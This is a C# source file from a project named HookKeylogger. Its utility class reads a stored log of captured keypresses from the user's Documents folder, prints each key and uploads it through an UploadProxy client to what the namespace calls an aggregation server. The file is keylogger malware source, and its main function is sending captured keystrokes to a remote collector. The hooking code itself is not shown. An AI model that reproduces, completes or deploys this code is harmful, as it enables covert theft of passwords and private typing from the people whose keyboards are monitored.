using System;
using HookKeylogger.Base;
using System.Windows.Forms;
using HookKeylogger.AggergationServer.Types;

namespace HookKeylogger.Utils
{
    class PrintKeyLog
    {
        static void Main(string[] args)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            Console.WriteLine(path);
            Console.ReadKey();
            KeyPressBuffer kpb = new KeyPressBuffer(path);
            UploadProxy.UploadProxyClient client = new UploadProxy.UploadProxyClient();
            foreach (KeyPress ks in kpb.Keys)
            {
                Console.WriteLine(ks.Key);
                var ci = new CI();
                ci.Type = "KeyPress";
                ci.Data = ((Keys)ks.Key).ToString();
                Console.WriteLine("DATA: " + ci.Data);
                client.SendCi(ci);
            }
            client.close();
            Console.ReadKey();
        }
    }
}
